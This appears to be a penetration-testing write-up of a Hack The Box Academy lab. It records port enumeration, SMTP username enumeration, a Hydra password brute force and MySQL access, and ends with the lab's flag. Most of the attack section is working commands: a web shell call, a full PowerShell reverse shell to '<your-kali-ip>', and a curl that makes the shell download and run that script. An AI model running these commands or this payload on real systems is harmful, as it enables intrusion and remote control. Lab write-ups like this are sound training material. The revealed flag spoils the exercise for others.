# NOTES

## Port 80 Enumeration
There's [XAMPP](./port80_webapp.png) app on port 80.

Server header shows as: `Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29`

## Port 443 Enumeration

There's basic HTTP auth. Attempted `admin:admin` and it didn't work.

## Port 22 Enumeration

* Can connect but there's no anonymous. Tried the following
  * admin:admin (x)
  * anonymous:anonymous (x)
  * ftp:ftp (x)

## Port 25 Enumeration

Found 1 user. 

```bash
└─$ run smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -D inlanefreight.htb -t 10.129.203.7
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10713
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Wed Apr 22 12:56:31 2026 #########
10.129.203.7: fiona@inlanefreight.htb exists
######## Scan completed at Wed Apr 22 13:31:22 2026 #########
1 results.

10713 queries in 2091 seconds (5.1 queries / sec)
📋 Logged: /home/openclaw/.openclaw/workspace-neo/htb/academy/attacking-common-services-easy/raw_data/cmd_20260422_125631.log
```

Was able to brute force the password as well.

```bash
# Hydra v9.6 run at 2026-04-22 13:50:53 on 10.129.203.7 smtp (hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 32 -o /tmp/hydra_fiona.txt smtp://10.129.203.7:587)
[587][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321
```

## Port 22 with fiona credentials

`fiona:987654321` works. However, ftp server has passive mode and prevents getting access to data

```
└─$ lftp -u fiona,987654321 10.129.203.7
lftp fiona@10.129.203.7:~> ls
ls: Fatal error: Certificate verification: The certificate is NOT trusted. The certificate issuer is unknown.  (50:18:D8:D5:BA:6B:5A:1C:8D:F6:59:69:45:D7:FE:06:3D:32:7F:AD)
lftp fiona@10.129.203.7:~> set ftp:passive-mode on
lftp fiona@10.129.203.7:~> set ftp:extended-passive on
ftp:extended-passive: no such variable. Use `set -a' to look at all variables.
lftp fiona@10.129.203.7:~> set ssl:verify-certificate no
lftp fiona@10.129.203.7:~> ls
`ls' at 0 [Making data connection...]
```

## Port 443 with fiona creds

fiona:987654321 is valid for the HTTP basic auth. 

![](./port_443_fiona.png)

I provides page to upload to the FTP file server. Candidate for reverse shell. The WebServersInfo.txt had the following content:

```text
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

## Port 3389 (RDP) wiht fion creds

Didn't work. Couldn't login

## Port 3306 (MySQL) with fiona creds

Worked to login.

```
┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/academy/attacking-common-services-easy/raw_data]
└─$ mysql -h 10.129.203.7 -u fiona -p987654321 --skip-ssl
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 11
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| test               |
+--------------------+
5 rows in set (0.209 sec)
```

### Enumerating MySQL

```
MariaDB [phpmyadmin]> show tables;
+------------------------+
| Tables_in_phpmyadmin   |
+------------------------+
| pma__bookmark          |
| pma__central_columns   |
| pma__column_info       |
| pma__designer_settings |
| pma__export_templates  |
| pma__favorite          |
| pma__history           |
| pma__navigationhiding  |
| pma__pdf_pages         |
| pma__recent            |
| pma__relation          |
| pma__savedsearches     |
| pma__table_coords      |
| pma__table_info        |
| pma__table_uiprefs     |
| pma__tracking          |
| pma__userconfig        |
| pma__usergroups        |
| pma__users             |
+------------------------+
19 rows in set (0.193 sec)

MariaDB [phpmyadmin]> select * from pma__users;
Empty set (0.461 sec)

MariaDB [phpmyadmin]>
```

```
MariaDB [mysql]> select * from user;
+-----------+-------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
| Host      | User  | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | Delete_history_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                     | password_expired | is_role | default_role | max_statement_time |
+-----------+-------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
| localhost | root  |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |                       |                                           | N                | N       |              |           0.000000 |
| %         | fiona | *DABCF719388B72AD432DE5E88423B56D652DD8B0 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *DABCF719388B72AD432DE5E88423B56D652DD8B0 | N                | N       |              |           0.000000 |
| 127.0.0.1 | root  |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |                       |                                           | N                | N       |              |           0.000000 |
| ::1       | root  |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      | Y                   |          |            |             |              |             0 |           0 |               0 |                    0 |                       |                                           | N                | N       |              |           0.000000 |
| localhost | pma   |                                           | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      | N                   |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password |                                           | N                | N       |              |           0.000000 |
+-----------+-------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+---------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+---------+--------------+--------------------+
5 rows in set (0.198 sec)
```

```
MariaDB [mysql]> use test;
Database changed
MariaDB [test]> show tables;
Empty set (0.195 sec)

MariaDB [test]>
```

Vulnerable to writing to files from MySQL:

```
MariaDB [test]> show variables like "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.195 sec)
```

We got RCE

```
➜  ~ curl "http://inlanefreight.htb/shell.php?cmd=whoami"
nt authority\system
```

Got RCE

Used RCE to create rev shell.

```
cat > /tmp/rev.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient("<your-kali-ip>",4444);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$reader = New-Object System.IO.StreamReader($stream);
$writer.AutoFlush = $true;
$writer.WriteLine("Connected");
while($client.Connected) {
    $cmd = $reader.ReadLine();
    if($cmd -eq "exit") { break }
    $output = Invoke-Expression $cmd 2>&1 | Out-String;
    $writer.WriteLine($output);
}
$client.Close();
EOF
python3 -m http.server 8080

# Trigger via web shell
curl "http://inlanefreight.htb/shell.php?cmd=powershell%20-ExecutionPolicy%20Bypass%20-c%20%22IEX(New-Object%20Net.WebClient).downloadString('http://<your-kali-ip>:8080/rev.ps1')%22"
```


Got the flag

```
cd c:\Users\Administrator\Desktop

dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2022  10:36 AM             39 flag.txt



type flag.txt
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```